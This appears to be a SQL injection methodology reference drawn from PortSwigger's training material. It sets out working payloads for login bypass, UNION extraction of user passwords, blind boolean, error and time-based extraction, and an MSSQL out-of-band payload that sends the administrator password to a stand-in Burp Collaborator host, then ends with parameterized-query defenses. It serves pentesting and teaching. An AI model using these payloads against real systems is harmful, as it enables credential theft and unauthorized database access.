# SQL Injection — Reference

PortSwigger-derived methodology. Sources:
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/union-attacks
- https://portswigger.net/web-security/sql-injection/blind
- https://portswigger.net/web-security/sql-injection/examining-the-database
- https://portswigger.net/web-security/sql-injection/cheat-sheet

---

## 1. What SQLi is and where it occurs

SQL injection lets an attacker interfere with the queries an application makes to its database, allowing unauthorized reads, modification/deletion, backend compromise, or DoS.

Injection points by query location:
- **WHERE clause of SELECT** — most common; filters, search, `id=`, category.
- **UPDATE** — the SET values or the WHERE clause.
- **INSERT** — the inserted values.
- **SELECT structure** — table name, column name, **ORDER BY** clause.

ORDER BY is special: parameterized queries generally cannot protect column/sort positions, so injection there is common, but it is detected by index/expression behaviour (e.g. `ORDER BY 3`), not by quote-breaking.

---

## 2. Retrieving hidden data (logic subversion)

Original:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Payload `Gifts'--`:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
The `--` comments out the `AND released = 1` filter, returning unreleased rows.

`Gifts' OR 1=1--` returns all rows regardless of category. (Caution: `OR 1=1` in UPDATE/DELETE context affects every row — never use it where it could write/delete data.)

### Login bypass
```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
Username `administrator'--`:
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
Password check is commented out → authenticated as administrator.

---

## 3. Detection per query context

| Context | True/false probe | Notes |
|---|---|---|
| String value | `' AND '1'='1` vs `' AND '1'='2` | Must rebalance quotes or comment out the rest. |
| Numeric value | ` AND 1=1` vs ` AND 1=2` | No quotes needed. |
| Quoted numeric | `' AND 1=1--` | |
| ORDER BY | `ORDER BY 1`, `ORDER BY 2`… and conditional expressions | Cannot inject UNION directly; use index/CASE. |

Always run a control request between probes. Confirm differences are repeatable and condition-correlated, not network jitter.

---

## 4. UNION attacks (in-band extraction)

A UNION attack requires (a) the same number of columns in both queries and (b) compatible data types per column.

### 4.1 Determine the number of columns
**ORDER BY method** — increment until error:
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ← error here ⇒ previous count is correct
```
Typical error: *"The ORDER BY position number 3 is out of range of the number of items in the select list."*

**UNION SELECT NULL method** — increment NULLs until an extra row appears:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
Mismatch error: *"All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists."*
On Oracle every SELECT needs FROM: `' UNION SELECT NULL FROM DUAL--`.

### 4.2 Find a string-compatible column
Rotate a string literal through positions:
```
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
Type-mismatch error: *"Conversion failed when converting the varchar value 'a' to data type int."* — that position is not string-compatible.

### 4.3 Extract data
```
' UNION SELECT username, password FROM users--
```

### 4.4 Pack many values into one string column
When only one column holds strings, concatenate (with a separator so values are parseable):

| DB | Concatenation |
|---|---|
| Oracle | `' UNION SELECT username \|\| '~' \|\| password FROM users--` |
| PostgreSQL | `' UNION SELECT username \|\| '~' \|\| password FROM users--` |
| MSSQL | `' UNION SELECT username + '~' + password FROM users--` |
| MySQL | `' UNION SELECT CONCAT(username,'~',password) FROM users--` |

---

## 5. Examining the database

### Version / type
| DB | Query |
|---|---|
| MSSQL / MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` (or `SELECT banner FROM v$version`, `SELECT version FROM v$instance`) |
| PostgreSQL | `SELECT version()` |

Inject via UNION, e.g. `' UNION SELECT @@version--`.

### Listing contents
Non-Oracle (MySQL, MSSQL, PostgreSQL):
```sql
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```
Oracle:
```sql
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```

---

## 6. Blind SQL injection

Blind = the app is injectable but HTTP responses don't contain query results. Four channels:

### 6.1 Boolean (conditional responses)
```
xyz' AND '1'='1     ← normal response
xyz' AND '1'='2     ← different/absent response
```
Extract character-by-character:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)>'m
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1)='s
```
Use a binary search on the comparison to minimise requests.

### 6.2 Error-based blind (conditional errors)
Trigger a detectable error only when a condition is true (divide-by-zero):
```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a    ← no error
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a    ← error ⇒ condition true
```
Per-character:
```
xyz' AND (SELECT CASE WHEN (Username='Administrator' AND SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a
```
If errors are **verbose**, extract data directly via a cast that embeds the value in the error message:
```
CAST((SELECT example_column FROM example_table) AS int)
```
The conversion error often prints the offending string. MySQL variant uses `EXTRACTVALUE(1, CONCAT(0x5c,(SELECT ...)))`.

### 6.3 Time-based blind
Conditionally delay the response; infer truth from latency.
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--     (MSSQL) ← fast
'; IF (1=1) WAITFOR DELAY '0:0:10'--     (MSSQL) ← ~10s
'; IF (SELECT COUNT(Username) FROM Users WHERE Username='Administrator' AND SUBSTRING(Password,1,1)>'m')=1 WAITFOR DELAY '0:0:5'--
```
See cheatsheet.md for SLEEP/pg_sleep/dbms_pipe equivalents. Always test a 0-delay control to baseline latency.

### 6.4 Out-of-band (OAST) — DNS exfiltration
When there is no in-band difference at all, trigger a network interaction to a Collaborator/interactsh host. A received DNS/HTTP hit is proof.
```
'; exec master..xp_dirtree '//BURP-SUBDOMAIN/a'--          (MSSQL trigger)
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');
   exec('master..xp_dirtree "//'+@p+'.BURP-SUBDOMAIN/a"')--  (MSSQL exfil)
```
See cheatsheet.md for Oracle (EXTRACTVALUE/UTL_INADDR), PostgreSQL (`copy ... to program`), and MySQL (`LOAD_FILE`) equivalents.

---

## 7. SQLi in JSON / XML

Modern APIs carry params in JSON or XML bodies. The injection principle is identical; only the encoding/escaping changes:
- Inject into the **value** of a JSON field or XML node that maps to a SQL parameter.
- Some WAFs that parse JSON can be bypassed with unicode/escape encoding of the SQL metacharacters (e.g. `'` for `'`) inside the JSON string.
- For XML/SOAP, payloads may need XML-entity or CDATA encoding to survive parsing before reaching the SQL layer.
Detect with the same `'`, boolean, and time probes, just placed inside the structured body.

---

## 8. Second-order SQL injection

The app correctly escapes input on the **first** request (so it stores safely), then later reads that stored value and concatenates it into a SQL query **without** re-escaping. Developers wrongly trust already-stored data.
Methodology: plant a payload in a stored field (e.g. username at registration), then trigger the second code path that reads it (password change, profile lookup, admin report). Detection signal may appear only on the second request, not where you injected.

---

## 9. Prevention

Use **parameterized queries / prepared statements** for all user-supplied data in the query — the only robust defence:

Vulnerable:
```java
String query = "SELECT * FROM products WHERE category = '" + input + "'";
```
Safe:
```java
PreparedStatement statement = connection.prepareStatement(
    "SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
```
Parameterization cannot protect query **structure** (table/column names, ORDER BY) — for those, use a strict allowlist of permitted values. Defence-in-depth: least-privilege DB accounts, disabling dangerous functions (`xp_cmdshell`, `xp_dirtree`), and not exposing verbose DB errors.
